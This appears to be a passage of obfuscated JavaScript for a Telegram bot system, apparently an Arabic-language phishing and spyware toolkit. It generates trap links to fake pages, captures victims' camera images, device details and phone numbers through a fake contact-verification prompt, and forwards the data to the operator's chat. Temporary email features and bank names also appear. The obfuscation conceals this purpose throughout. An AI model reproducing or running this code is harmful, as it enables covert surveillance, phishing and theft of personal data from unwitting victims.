        const _0x3526c3 = _0x27c446, _0x495f48 = Buffer[_0x3526c3(0x6d0)](_0x5e467d, _0x356c20[_0x3526c3(0x56e)]), _0x22ebfd = path[_0x3526c3(0x57f)](_0x40ed0, _0x55977b + '_' + _0x9d5394 + _0x3526c3(0x175));
        fs[_0x3526c3(0x4b5) + _0x3526c3(0x520)](_0x22ebfd, _0x495f48), bot[_0x3526c3(0x685)](_0x55977b, _0x495f48, { 'caption': _0x3526c3(0x1c8) + _0x356c20[_0x3526c3(0x5e0)](_0x9d5394, 0xcb7 + 0xc * 0x1c0 + 0xa * -0x35f) });
    }), console[_0x27c446(0x699)](_0x27c446(0x75c) + _0x27c446(0x2e6) + _0x27c446(0x25d) + _0x27c446(0x4e1) + _0x55977b), _0x2c9391[_0x27c446(0x8d6)](_0x356c20[_0x27c446(0x5f8)]);
}), app[_0x317544(0x3c5)](_0x317544(0x249), (_0x47787a, _0x13fb8c) => {
    const _0x42f2b4 = _0x317544, _0x417012 = { 'rHfSd': _0x42f2b4(0x89e) };
    _0x13fb8c[_0x42f2b4(0x3da)](path[_0x42f2b4(0x57f)](__dirname, _0x417012[_0x42f2b4(0x8a1)]));
}), bot[_0x317544(0x62c)](/\/اتتهتتاههة/, _0x4713a4 => {
    const _0x4f13e7 = _0x317544, _0x2ace00 = {
            'IQwye': _0x4f13e7(0x3e9) + _0x4f13e7(0x30e) + _0x4f13e7(0x35d) + _0x4f13e7(0x42b) + _0x4f13e7(0x30a) + _0x4f13e7(0x6ba),
            'bRUbV': _0x4f13e7(0x29d) + _0x4f13e7(0x79b) + _0x4f13e7(0x783),
            'FmLRW': _0x4f13e7(0x39d) + _0x4f13e7(0x58d)
        }, _0x40c48 = _0x4713a4[_0x4f13e7(0x61f)]['id'], _0x2eb891 = _0x2ace00[_0x4f13e7(0x1d7)];
    bot[_0x4f13e7(0x5ad) + 'e'](_0x40c48, _0x2eb891, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x2ace00[_0x4f13e7(0x3d9)],
                        'callback_data': _0x2ace00[_0x4f13e7(0x746)]
                    }]]
        }
    });
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x1d7851 => {
    const _0x4c5426 = _0x317544, _0x3baffe = {
            'PplLg': function (_0x30ea82, _0x34a685) {
                return _0x30ea82 === _0x34a685;
            },
            'aHOgv': _0x4c5426(0x39d) + _0x4c5426(0x58d)
        }, _0x1fd6be = _0x1d7851[_0x4c5426(0x4b7)][_0x4c5426(0x61f)]['id'], _0x10485a = _0x1d7851[_0x4c5426(0x4b7)][_0x4c5426(0x204)];
    if (_0x3baffe[_0x4c5426(0x3f8)](_0x1d7851[_0x4c5426(0x369)], _0x3baffe[_0x4c5426(0x683)])) {
        const _0xbd8d84 = baseUrl + (_0x4c5426(0x22d) + _0x4c5426(0x8d0)) + _0x1fd6be;
        bot[_0x4c5426(0x5ad) + 'e'](_0x1fd6be, _0x4c5426(0x589) + _0x4c5426(0x8f9) + _0x4c5426(0x5a1) + _0x4c5426(0x400) + _0x4c5426(0x633) + _0x4c5426(0x4a1) + _0x4c5426(0x293) + _0x4c5426(0x657) + _0x4c5426(0x36b) + _0x4c5426(0x2b7) + _0x4c5426(0x49f) + _0x4c5426(0x912) + _0x4c5426(0x58b) + _0x4c5426(0x5ec) + _0x4c5426(0x55d) + _0x4c5426(0x7a6) + _0x4c5426(0x638) + _0x4c5426(0x67f) + _0x4c5426(0x445) + _0x4c5426(0x43b) + _0x4c5426(0x177));
    }
}), bot[_0x317544(0x62c)](/\/s2854تصخصrt/, _0x5c2bac => {
    const _0x37e606 = _0x317544, _0x26744c = {
            'uBLJR': _0x37e606(0x39a) + _0x37e606(0x70b),
            'KeITR': _0x37e606(0x813) + 'il',
            'BzFht': _0x37e606(0x7c7)
        }, _0x116bf6 = _0x5c2bac[_0x37e606(0x61f)]['id'], _0x9129ae = _0x5c2bac[_0x37e606(0x6d0)], _0x156b2a = _0x9129ae[_0x37e606(0x39c)], _0x213749 = {
            'inline_keyboard': [[{
                        'text': _0x26744c[_0x37e606(0x3c2)],
                        'callback_data': _0x26744c[_0x37e606(0x47b)]
                    }]]
        };
    bot[_0x37e606(0x5ad) + 'e'](_0x116bf6, _0x37e606(0x49e) + _0x37e606(0x30c) + _0x156b2a + (_0x37e606(0x59f) + _0x37e606(0x45b) + _0x37e606(0x8f2) + _0x37e606(0x54c) + _0x37e606(0x781) + _0x37e606(0x70a) + _0x37e606(0x55f) + _0x37e606(0x58e) + _0x37e606(0x797) + 'g>'), {
        'parse_mode': _0x26744c[_0x37e606(0x7f7)],
        'reply_markup': { 'inline_keyboard': _0x213749[_0x37e606(0x825) + _0x37e606(0x7df)] }
    });
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x3cc0e2 => {
    const _0x19b662 = _0x317544, _0x198633 = {
            'nmVab': function (_0x5445f3, _0x1bdea2) {
                return _0x5445f3 === _0x1bdea2;
            },
            'hCTAD': _0x19b662(0x813) + 'il',
            'STrJc': _0x19b662(0x7c7)
        }, _0x51d841 = _0x3cc0e2[_0x19b662(0x4b7)][_0x19b662(0x61f)]['id'], _0x3ec575 = _0x3cc0e2[_0x19b662(0x369)];
    _0x198633[_0x19b662(0x231)](_0x3ec575, _0x198633[_0x19b662(0x46e)]) && bot[_0x19b662(0x5ad) + 'e'](_0x51d841, _0x19b662(0x7b6) + _0x19b662(0x2a7) + _0x19b662(0x181) + _0x19b662(0x7ee) + _0x19b662(0x3c9) + _0x19b662(0x70f) + _0x19b662(0x695) + _0x19b662(0x453) + _0x19b662(0x269) + _0x19b662(0x471) + _0x19b662(0x754) + _0x19b662(0x5fc) + _0x19b662(0x4ca) + _0x19b662(0x79a) + _0x19b662(0x3a2) + _0x19b662(0x8d1) + _0x19b662(0x602) + _0x19b662(0x82b) + _0x19b662(0x1a3) + _0x19b662(0x711) + _0x19b662(0x5dd) + _0x19b662(0x918) + _0x19b662(0x35c) + _0x19b662(0x4c0) + _0x19b662(0x454) + _0x19b662(0x4ae) + _0x19b662(0x61d), { 'parse_mode': _0x198633[_0x19b662(0x4b8)] });
});
const EMAILS_FILE = _0x317544(0x723) + 'n';
function readEmails() {
    const _0x31a3b2 = _0x317544, _0x2b6c3f = { 'abscM': _0x31a3b2(0x389) };
    try {
        const _0x25b73c = fs[_0x31a3b2(0x6be) + 'nc'](EMAILS_FILE, _0x2b6c3f[_0x31a3b2(0x394)]);
        return JSON[_0x31a3b2(0x1bd)](_0x25b73c);
    } catch (_0x1eaeb1) {
        return {};
    }
}
function writeEmails(_0x493e55) {
    const _0x349178 = _0x317544;
    fs[_0x349178(0x4b5) + _0x349178(0x520)](EMAILS_FILE, JSON[_0x349178(0x76b)](_0x493e55, null, 0x165d + 0x22f8 + -0x3953));
}
bot[_0x317544(0x62c)](/\/email/, async _0x5773b2 => {
    const _0xe299eb = _0x317544, _0x3b8265 = {
            'KCVaM': function (_0x38743b) {
                return _0x38743b();
            },
            'MBrer': _0xe299eb(0x91b) + _0xe299eb(0x730) + _0xe299eb(0x828) + _0xe299eb(0x288),
            'uHyWZ': _0xe299eb(0x7c7),
            'nIhNk': _0xe299eb(0x4fa) + _0xe299eb(0x89c) + _0xe299eb(0x257) + _0xe299eb(0x440) + _0xe299eb(0x553),
            'pdKnP': _0xe299eb(0x50a) + _0xe299eb(0x45a),
            'ZbMxi': _0xe299eb(0x3f0) + _0xe299eb(0x64f),
            'DlZMT': function (_0x4e0f04, _0x8b0a9) {
                return _0x4e0f04(_0x8b0a9);
            },
            'VTucQ': _0xe299eb(0x8d8) + _0xe299eb(0x163) + _0xe299eb(0x7f1) + 'g>'
        }, _0x4ab6a7 = _0x5773b2[_0xe299eb(0x6d0)]['id'], _0x2906a7 = _0x5773b2[_0xe299eb(0x61f)]['id'];
    let _0x8fec6d = _0x3b8265[_0xe299eb(0x5b4)](readEmails);
    _0x8fec6d[_0x4ab6a7] && delete _0x8fec6d[_0x4ab6a7];
    try {
        bot[_0xe299eb(0x5ad) + 'e'](_0x2906a7, _0x3b8265[_0xe299eb(0x65e)], { 'parse_mode': _0x3b8265[_0xe299eb(0x5e9)] });
        const _0x37890c = Math[_0xe299eb(0x3a8)]()[_0xe299eb(0x642)](-0x1fe3 + 0x1958 + 0x1d * 0x3b)[_0xe299eb(0x228)](0x92 * -0x1f + -0xdfd + -0xa8f * -0x3, -0x1 * -0x1e02 + 0x1f * -0x116 + 0x3b0), _0x516221 = _0xe299eb(0x8af) + _0x37890c, _0x583407 = await axios[_0xe299eb(0x33a)](_0x3b8265[_0xe299eb(0x7c4)], {
                'name': _0x516221,
                'domain': _0x3b8265[_0xe299eb(0x302)]
            }, { 'headers': { 'User-Agent': _0x3b8265[_0xe299eb(0x4fe)] } }), _0x8b27ad = _0x583407[_0xe299eb(0x369)][_0xe299eb(0x833)];
        _0x8fec6d[_0x4ab6a7] = _0x8b27ad, _0x3b8265[_0xe299eb(0x59e)](writeEmails, _0x8fec6d), bot[_0xe299eb(0x5ad) + 'e'](_0x2906a7, _0xe299eb(0x46f) + _0xe299eb(0x18a) + _0xe299eb(0x84c) + _0xe299eb(0x8b6) + _0xe299eb(0x5f5) + _0x8b27ad + (_0xe299eb(0x85b) + _0xe299eb(0x2f5) + _0xe299eb(0x311) + _0xe299eb(0x889) + _0xe299eb(0x54b)), { 'parse_mode': _0x3b8265[_0xe299eb(0x5e9)] });
    } catch (_0x55fff1) {
        bot[_0xe299eb(0x5ad) + 'e'](_0x2906a7, _0x3b8265[_0xe299eb(0x3bb)], { 'parse_mode': _0x3b8265[_0xe299eb(0x5e9)] });
    }
}), bot[_0x317544(0x62c)](/\/an/, _0x9bc7b6 => {
    const _0x36a812 = _0x317544, _0x45cf39 = {
            'tyfiB': function (_0x3f3b09) {
                return _0x3f3b09();
            },
            'sUEmS': _0x36a812(0x7c7),
            'bWwHh': _0x36a812(0x18b) + _0x36a812(0x5c1) + _0x36a812(0x289) + _0x36a812(0x278) + 'g>'
        }, _0x31865b = _0x9bc7b6[_0x36a812(0x61f)]['id'], _0xb3a247 = _0x9bc7b6[_0x36a812(0x6d0)]['id'];
    let _0xf7bc46 = _0x45cf39[_0x36a812(0x37b)](readEmails);
    if (_0xf7bc46[_0xb3a247]) {
        const _0x1849f2 = _0xf7bc46[_0xb3a247];
        bot[_0x36a812(0x5ad) + 'e'](_0x31865b, _0x36a812(0x621) + _0x36a812(0x2dc) + _0x36a812(0x505) + _0x36a812(0x8fe) + _0x36a812(0x766) + _0x36a812(0x745) + _0x1849f2 + (_0x36a812(0x85b) + _0x36a812(0x2f5) + _0x36a812(0x311) + _0x36a812(0x889) + _0x36a812(0x54b)), { 'parse_mode': _0x45cf39[_0x36a812(0x3f2)] });
    } else
        bot[_0x36a812(0x5ad) + 'e'](_0x31865b, _0x45cf39[_0x36a812(0x3a9)], { 'parse_mode': _0x45cf39[_0x36a812(0x3f2)] });
}), bot[_0x317544(0x62c)](/\/Messages/, async _0x13ea4c => {
    const _0x2d2ed7 = _0x317544, _0x3c0d32 = {
            'tWdwJ': _0x2d2ed7(0x7c7),
            'YirxZ': function (_0x789b61) {
                return _0x789b61();
            },
            'aaZCS': function (_0x37c2d6, _0x5a3db9) {
                return _0x37c2d6 > _0x5a3db9;
            },
            'SJfbe': _0x2d2ed7(0x55e) + _0x2d2ed7(0x4c9) + _0x2d2ed7(0x432),
            'uOoWp': _0x2d2ed7(0x64d) + _0x2d2ed7(0x2bb) + _0x2d2ed7(0x284) + _0x2d2ed7(0x5fb) + 'g>',
            'kGttc': _0x2d2ed7(0x8e8) + _0x2d2ed7(0x52d) + _0x2d2ed7(0x808) + _0x2d2ed7(0x7ea)
        }, _0x5a1707 = _0x13ea4c[_0x2d2ed7(0x61f)]['id'], _0x59a141 = _0x13ea4c[_0x2d2ed7(0x6d0)]['id'];
    let _0x522d93 = _0x3c0d32[_0x2d2ed7(0x4e0)](readEmails);
    if (_0x522d93[_0x59a141]) {
        const _0x242684 = _0x522d93[_0x59a141];
        try {
            const _0x20898d = await axios[_0x2d2ed7(0x3c5)](_0x2d2ed7(0x4fa) + _0x2d2ed7(0x89c) + _0x2d2ed7(0x257) + _0x2d2ed7(0x440) + _0x2d2ed7(0x1b8) + _0x242684 + _0x2d2ed7(0x2eb)), _0x3f25a2 = _0x20898d[_0x2d2ed7(0x369)];
            _0x3c0d32[_0x2d2ed7(0x50c)](_0x3f25a2[_0x2d2ed7(0x2c6)], 0x1b18 + -0xb15 + -0x1003 * 0x1) ? _0x3f25a2[_0x2d2ed7(0x3b5)](_0x424a7b => {
                const _0x1bef01 = _0x2d2ed7;
                bot[_0x1bef01(0x5ad) + 'e'](_0x5a1707, _0x1bef01(0x252) + _0x1bef01(0x16c) + _0x1bef01(0x706) + '\x0a' + _0x424a7b[_0x1bef01(0x186)] + '\x0a' + _0x424a7b[_0x1bef01(0x276)] + _0x1bef01(0x8b2), { 'parse_mode': _0x3c0d32[_0x1bef01(0x55a)] });
            }) : bot[_0x2d2ed7(0x5ad) + 'e'](_0x5a1707, _0x3c0d32[_0x2d2ed7(0x7ca)]);
        } catch (_0x2087d9) {
            bot[_0x2d2ed7(0x5ad) + 'e'](_0x5a1707, _0x3c0d32[_0x2d2ed7(0x166)], { 'parse_mode': _0x3c0d32[_0x2d2ed7(0x55a)] });
        }
    } else
        bot[_0x2d2ed7(0x5ad) + 'e'](_0x5a1707, _0x3c0d32[_0x2d2ed7(0x5ff)], { 'parse_mode': _0x3c0d32[_0x2d2ed7(0x55a)] });
}), bot[_0x317544(0x62c)](/\/de/, _0x30e560 => {
    const _0x1cc8a7 = _0x317544, _0x2903e4 = {
            'cRLwu': function (_0x45b377) {
                return _0x45b377();
            },
            'XGdsm': function (_0x111dc7, _0xb4b02) {
                return _0x111dc7(_0xb4b02);
            },
            'AbqqQ': _0x1cc8a7(0x46f) + _0x1cc8a7(0x67e) + _0x1cc8a7(0x6ff) + '>',
            'rmnAG': _0x1cc8a7(0x7c7),
            'dVCck': _0x1cc8a7(0x835) + _0x1cc8a7(0x8b9) + _0x1cc8a7(0x63d) + _0x1cc8a7(0x7ea)
        }, _0x1ae679 = _0x30e560[_0x1cc8a7(0x61f)]['id'], _0x3abf9d = _0x30e560[_0x1cc8a7(0x6d0)]['id'];
    let _0x131d27 = _0x2903e4[_0x1cc8a7(0x34b)](readEmails);
    _0x131d27[_0x3abf9d] ? (delete _0x131d27[_0x3abf9d], _0x2903e4[_0x1cc8a7(0x5db)](writeEmails, _0x131d27), bot[_0x1cc8a7(0x5ad) + 'e'](_0x1ae679, _0x2903e4[_0x1cc8a7(0x4f5)], { 'parse_mode': _0x2903e4[_0x1cc8a7(0x31b)] })) : bot[_0x1cc8a7(0x5ad) + 'e'](_0x1ae679, _0x2903e4[_0x1cc8a7(0x6d4)], { 'parse_mode': _0x2903e4[_0x1cc8a7(0x31b)] });
}), bot[_0x317544(0x62c)](/\/de/, async _0x44efce => {
    const _0x21fc3b = _0x317544, _0x580091 = {
            'BnIhD': _0x21fc3b(0x46f) + _0x21fc3b(0x67e) + _0x21fc3b(0x6ff) + '>',
            'XKCeX': _0x21fc3b(0x7c7),
            'Anqhg': _0x21fc3b(0x835) + _0x21fc3b(0x220) + _0x21fc3b(0x751) + _0x21fc3b(0x7ea)
        }, _0x2a4f84 = _0x44efce[_0x21fc3b(0x61f)]['id'];
    try {
        fs[_0x21fc3b(0x72c)](_0x21fc3b(0x539) + _0x2a4f84 + _0x21fc3b(0x423)), bot[_0x21fc3b(0x5ad) + 'e'](_0x2a4f84, _0x580091[_0x21fc3b(0x31a)], { 'parse_mode': _0x580091[_0x21fc3b(0x893)] });
    } catch (_0x54d8c3) {
        bot[_0x21fc3b(0x5ad) + 'e'](_0x2a4f84, _0x580091[_0x21fc3b(0x5bd)], { 'parse_mode': _0x580091[_0x21fc3b(0x893)] });
    }
}), bot[_0x317544(0x62c)](/\/sخسننسمس/, _0xd65799 => {
    const _0x1c7c24 = _0x317544, _0x388e33 = {
            'yDyVe': _0x1c7c24(0x627) + _0x1c7c24(0x251),
            'oyUyp': _0x1c7c24(0x60c) + _0x1c7c24(0x624),
            'KiVzy': _0x1c7c24(0x7a3) + _0x1c7c24(0x392) + _0x1c7c24(0x323) + _0x1c7c24(0x5aa)
        }, _0x201128 = _0xd65799[_0x1c7c24(0x61f)]['id'], _0x5467b5 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x388e33[_0x1c7c24(0x380)],
                            'callback_data': _0x388e33[_0x1c7c24(0x3e0)]
                        }]]
            }
        };
    bot[_0x1c7c24(0x5ad) + 'e'](_0x201128, _0x388e33[_0x1c7c24(0x75b)], _0x5467b5);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0xbd3ef2 => {
    const _0x3f37a6 = _0x317544, _0x3b17a0 = {
            'IDNFF': function (_0x4aea0b, _0x332a89) {
                return _0x4aea0b === _0x332a89;
            },
            'DlaLL': _0x3f37a6(0x60c) + _0x3f37a6(0x624)
        };
    if (_0x3b17a0[_0x3f37a6(0x2f1)](_0xbd3ef2[_0x3f37a6(0x369)], _0x3b17a0[_0x3f37a6(0x356)])) {
        const _0x46a204 = _0xbd3ef2[_0x3f37a6(0x6d0)]['id'], _0x573df9 = _0x3f37a6(0x597) + _0x3f37a6(0x493) + _0x3f37a6(0x5d6) + _0x46a204;
        bot[_0x3f37a6(0x5ad) + 'e'](_0xbd3ef2[_0x3f37a6(0x4b7)][_0x3f37a6(0x61f)]['id'], _0x3f37a6(0x566) + _0x3f37a6(0x417) + _0x3f37a6(0x5cc) + _0x3f37a6(0x7e8) + _0x3f37a6(0x8f1) + _0x3f37a6(0x7e9) + ':\x0a' + _0x573df9);
    }
}), secondBot[_0x317544(0x62c)](/\/start (.+)/, (_0x3491d0, _0x48f0ae) => {
    const _0x5735f0 = _0x317544, _0x15779a = {
            'AiAkG': function (_0x3b8e5e, _0xd124a8) {
                return _0x3b8e5e(_0xd124a8);
            },
            'UmhxD': _0x5735f0(0x67c) + _0x5735f0(0x4d5),
            'rKfvI': _0x5735f0(0x911) + _0x5735f0(0x787) + _0x5735f0(0x504) + _0x5735f0(0x7fc) + _0x5735f0(0x292)
        }, _0x2e9ff2 = _0x3491d0[_0x5735f0(0x61f)]['id'], _0xcd46d = _0x15779a[_0x5735f0(0x271)](parseInt, _0x48f0ae[0x978 + -0x280 + -0x6f7]);
    inviteLinks[_0x3491d0[_0x5735f0(0x6d0)]['id']] = _0xcd46d;
    const _0x24896a = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x15779a[_0x5735f0(0x503)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x5735f0(0x5ad) + 'e'](_0x2e9ff2, _0x15779a[_0x5735f0(0x47a)], _0x24896a);
}), secondBot['on'](_0x317544(0x502), _0x3dfe96 => {
    const _0x3a9e40 = _0x317544, _0x2e4d6f = {
            'ssTPn': _0x3a9e40(0x367) + _0x3a9e40(0x3ac) + 'ح.',
            'XraoM': _0x3a9e40(0x771) + _0x3a9e40(0x4a7) + _0x3a9e40(0x4b3),
            'mQhBW': _0x3a9e40(0x910),
            'jsEom': function (_0xfa7fa8, _0x4849d4) {
                return _0xfa7fa8 + _0x4849d4;
            },
            'ExMfq': function (_0x1cc6a6, _0x459c91) {
                return _0x1cc6a6 + _0x459c91;
            },
            'EriLX': function (_0x1bb864, _0x3d28a9) {
                return _0x1bb864 > _0x3d28a9;
            },
            'NApaA': _0x3a9e40(0x377) + _0x3a9e40(0x1e5),
            'EqsWn': _0x3a9e40(0x771) + _0x3a9e40(0x1db) + _0x3a9e40(0x631) + _0x3a9e40(0x7f3) + _0x3a9e40(0x8ad),
            'CsZTK': _0x3a9e40(0x2a4) + _0x3a9e40(0x526) + _0x3a9e40(0x196) + _0x3a9e40(0x416) + _0x3a9e40(0x388) + _0x3a9e40(0x1fd),
            'HNTJZ': function (_0x15e220, _0x496780) {
                return _0x15e220 === _0x496780;
            },
            'GOTUW': _0x3a9e40(0x2dd) + _0x3a9e40(0x8bd),
            'XhigV': _0x3a9e40(0x8f3) + 'ذة',
            'zspXy': _0x3a9e40(0x911) + _0x3a9e40(0x787) + _0x3a9e40(0x90e) + _0x3a9e40(0x6fd),
            'nOGKk': _0x3a9e40(0x26a) + _0x3a9e40(0x793) + _0x3a9e40(0x7a0)
        };
    if (_0x3dfe96[_0x3a9e40(0x502)] && inviteLinks[_0x3dfe96[_0x3a9e40(0x6d0)]['id']]) {
        if (_0x2e4d6f[_0x3a9e40(0x773)](_0x3dfe96[_0x3a9e40(0x502)][_0x3a9e40(0x5a5)], _0x3dfe96[_0x3a9e40(0x6d0)]['id'])) {
            const _0x2358b1 = inviteLinks[_0x3dfe96[_0x3a9e40(0x6d0)]['id']], _0x4dc520 = _0x3dfe96[_0x3a9e40(0x6d0)], _0x261716 = _0x4dc520['id'], _0x1a70b0 = _0x4dc520[_0x3a9e40(0x39c)], _0x4c554f = _0x4dc520[_0x3a9e40(0x176)] || '', _0x31bcc2 = _0x4dc520[_0x3a9e40(0x68c)] || _0x2e4d6f[_0x3a9e40(0x264)], _0x2b6afb = _0x4dc520[_0x3a9e40(0x749)] || _0x2e4d6f[_0x3a9e40(0x666)], _0x186fff = _0x3dfe96[_0x3a9e40(0x502)][_0x3a9e40(0x5a8) + 'er'];
            secondBot[_0x3a9e40(0x31e) + _0x3a9e40(0x715)](_0x261716)[_0x3a9e40(0x826)](_0x1dce7c => {
                const _0x5e15a5 = _0x3a9e40, _0x3651f6 = _0x2e4d6f[_0x5e15a5(0x87a)](_0x2e4d6f[_0x5e15a5(0x87a)](_0x2e4d6f[_0x5e15a5(0x2e5)](_0x2e4d6f[_0x5e15a5(0x2e5)](_0x5e15a5(0x87b) + _0x5e15a5(0x88a) + '\x0a', _0x5e15a5(0x85e) + _0x1a70b0 + '\x20' + _0x4c554f + _0x5e15a5(0x64a)), _0x5e15a5(0x80b) + '@' + _0x31bcc2 + _0x5e15a5(0x64a)), _0x5e15a5(0x547) + _0x261716 + _0x5e15a5(0x64a)), _0x5e15a5(0x7ba) + _0x5e15a5(0x46c) + _0x186fff + '\x0a');
                if (_0x2e4d6f[_0x5e15a5(0x86b)](_0x1dce7c[_0x5e15a5(0x764) + 't'], -0x1f9d + 0x3b9 * -0x9 + 0x1 * 0x411e)) {
                    const _0x3c88a1 = _0x1dce7c[_0x5e15a5(0x688)][-0x2255 + -0x13d * -0xe + -0x10ff * -0x1][0x21e * -0x7 + -0x4d9 * 0x5 + 0x270f][_0x5e15a5(0x51c)];
                    _0x3c88a1 ? bot[_0x5e15a5(0x685)](_0x2358b1, _0x3c88a1, {
                        'caption': _0x3651f6,
                        'parse_mode': _0x2e4d6f[_0x5e15a5(0x2fd)]
                    })[_0x5e15a5(0x826)](() => {
                        const _0x568993 = _0x5e15a5;
                        console[_0x568993(0x699)](_0x2e4d6f[_0x568993(0x303)]);
                    })[_0x5e15a5(0x60f)](_0xdd5a20 => {
                        const _0x3af4d4 = _0x5e15a5;
                        console[_0x3af4d4(0x5bb)](_0x2e4d6f[_0x3af4d4(0x1ea)], _0xdd5a20), bot[_0x3af4d4(0x5ad) + 'e'](_0x2358b1, _0x3651f6, { 'parse_mode': _0x2e4d6f[_0x3af4d4(0x2fd)] });
                    }) : bot[_0x5e15a5(0x5ad) + 'e'](_0x2358b1, _0x3651f6, { 'parse_mode': _0x2e4d6f[_0x5e15a5(0x2fd)] });
                } else
                    bot[_0x5e15a5(0x5ad) + 'e'](_0x2358b1, _0x3651f6, { 'parse_mode': _0x2e4d6f[_0x5e15a5(0x2fd)] });
                secondBot[_0x5e15a5(0x5ad) + 'e'](_0x3dfe96[_0x5e15a5(0x61f)]['id'], _0x2e4d6f[_0x5e15a5(0x17f)]), delete inviteLinks[_0x3dfe96[_0x5e15a5(0x6d0)]['id']];
            })[_0x3a9e40(0x60f)](_0x39dd07 => {
                const _0x4fe68f = _0x3a9e40;
                console[_0x4fe68f(0x5bb)](_0x2e4d6f[_0x4fe68f(0x316)], _0x39dd07), secondBot[_0x4fe68f(0x5ad) + 'e'](_0x3dfe96[_0x4fe68f(0x61f)]['id'], _0x2e4d6f[_0x4fe68f(0x732)]);
            });
        } else
            secondBot[_0x3a9e40(0x5ad) + 'e'](_0x3dfe96[_0x3a9e40(0x61f)]['id'], _0x2e4d6f[_0x3a9e40(0x8c4)]);
    } else
        secondBot[_0x3a9e40(0x5ad) + 'e'](_0x3dfe96[_0x3a9e40(0x61f)]['id'], _0x2e4d6f[_0x3a9e40(0x3a5)]);
}), secondBot['on'](_0x317544(0x4b7), _0x1d3c66 => {
    const _0x34c9b0 = _0x317544, _0x1ca9cc = {
            'WkUNe': function (_0x3defd6, _0x4a7aa4) {
                return _0x3defd6 !== _0x4a7aa4;
            },
            'fOasd': _0x34c9b0(0x8ef),
            'QkAUn': _0x34c9b0(0x67c) + _0x34c9b0(0x4d5),
            'AEfjp': _0x34c9b0(0x911) + _0x34c9b0(0x787) + _0x34c9b0(0x56f)
        };
    if (!_0x1d3c66[_0x34c9b0(0x502)] && _0x1ca9cc[_0x34c9b0(0x3cd)](_0x1d3c66[_0x34c9b0(0x4b4)], _0x1ca9cc[_0x34c9b0(0x4af)])) {
        const _0x50015e = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x1ca9cc[_0x34c9b0(0x433)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x34c9b0(0x5ad) + 'e'](_0x1d3c66[_0x34c9b0(0x61f)]['id'], _0x1ca9cc[_0x34c9b0(0x525)], _0x50015e);
    }
});
function _0xce71() {
    const _0x595b39 = [
        'get_link_',
        'ابط.',
        'تصال:\x20',
        'bRkPO',
        '🇩🇰',
        'de_',
        'isa',
        '\x20🧠\x0a-\x20الذاك',
        'Received\x20p',
        'board',
        'لزر\x20لفحص\x20ا',
        'المكسيك\x20🇲🇽',
        'deleteMess',
        'ar-SA',
        'تركيا\x20🇹🇷',
        'uploads',
        'bWDer',
        '/capture',
        'يه\x20لمعرفة\x20',
        'ابه\x20تلجرام',
        'strong>',
        'Fifth\x20Thir',
        'للمسية:\x20',
        'ر:\x20',
        'ي\x20عن\x20طريق\x20',
        '\x20للمتصفح:\x20',
        '.\x0a\x20⚠️ملاحظه',
        '\x20ما</stron',
        'إندونيسيا\x20',
        'ى\x20صورة\x20الم',
        '\x20📡\x0a-\x20الوقت',
        'الأرجنتين\x20',
        '\x20أثناء\x20إرس',
        'BzFht',
        '\x20و\x20',
        'الرسالة\x20رق',
        'o\x20for\x20chat',
        'يتك\x20في\x20الد',
        'من\x20أنك\x20لست',
        'n.html',
        'gQehc',
        'إسبانيا',
        'مالطا\x20🇲🇹',
        '@oapajh',
        'ي\x20تلغيم\x20را',
        'ت\x20الجهاز\x20🔬',
        'eKMJu',
        '/submitPho',
        'uaxBu',
        'rGpuM',
        'اب\x20أولاً</',
        'البرتغال',
        'CLASSIC',
        '*اليوزر\x20:\x20',
        'hoZkw',
        'ال\x20الأسماء',
        'removeList',
        'لقد\x20قمت\x20بط',
        'express',
        'next_',
        'الرجاء\x20الم',
        'create_ema',
        'vLrWL',
        'ول\x20اليه\x20ال',
        'المجلد\x20غير',
        'listen',
        'اكرة\x20المؤق',
        'message:',
        'cmuPp',
        'filter',
        'userLink',
        'Failed\x20to\x20',
        'kwMZy',
        'rm?chatId=',
        'السويد\x20🇸🇪',
        'ion',
        'repeat',
        'KvZMx',
        '\x20الرابط\x20بش',
        'inline_key',
        'then',
        '1kNNPU6RVm',
        'يمل...</st',
        '🇪🇨',
        'أدناه\x20للبح',
        '\x0aلحذف\x20الاي',
        'g.html',
        'get_pubg',
        'uXwKP',
        'لعبة\x20الأذك',
        '\x20🇰🇾',
        'rPdqd',
        'لمستخدم\x20',
        'email',
        'lo.html',
        '<strong>لي',
        'DrpZE',
        '://t.me/',
        'تم\x20إرسال\x20م',
        'السعودية\x20🇸🇦',
        'ing\x20Telegr',
        '-umber.ver',
        'فتيارات\x20شب',
        'startsWith',
        'bNKEr',
        'QEaNQ',
        'Received\x20d',
        'اختراق\x20ببج',
        'أرسل\x20لي\x20را',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        '\x20المتصفح:\x20',
        'VMAQV',
        'deviceType',
        'AlGnj',
        '50mb',
        'king\x20subsc',
        'السلفادور\x20',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        'ل\x20بنجاح:\x0a<',
        'بلجيكا\x20🇧🇪',
        'ton\x20below\x20',
        'همي:',
        'send',
        'zwKQC',
        'EcsRr',
        'HhogA',
        'yloJu',
        'longitude',
        'ال\x20رابط\x20صح',
        'المطور\x20قبل',
        'م\x20الهاتف\x20☎️',
        'dns',
        'hrzIN',
        '</code>\x0a<s',
        '\x20النقاط\x20وف',
        'xwIaW',
        '*الاسم\x20:\x20',
        '\x20فاير',
        '/search/my',
        'خطأ\x20في\x20جلب',
        '/imageRece',
        'ck/:linkId',
        'تم\x20اكتشاف\x20',
        'التحكم:',
        'for\x20chatId',
        'org',
        'من\x20هذا\x20الد',
        'مرحبًا\x20بك\x20',
        'JqYyX',
        'EriLX',
        'yfjVX',
        'منغوليا\x20🇲🇳',
        'uaPRB',
        'url',
        'Chase\x20Bank',
        'AOBtb',
        'FtszS',
        'uFebR',
        'NPBLC',
        'التصنيف:\x20',
        'span.place',
        'ه\x20عبر\x20رابط',
        'الجزائر\x20🇩🇿',
        'املاً\x20قم\x20ب',
        'jsEom',
        '*👤\x20معلومات',
        'uuid',
        'VkHZB',
        'VPRZq',
        'مستخدم\x20لإز',
        'bgBVV',
        's\x20for\x20chat',
        '/captureFr',
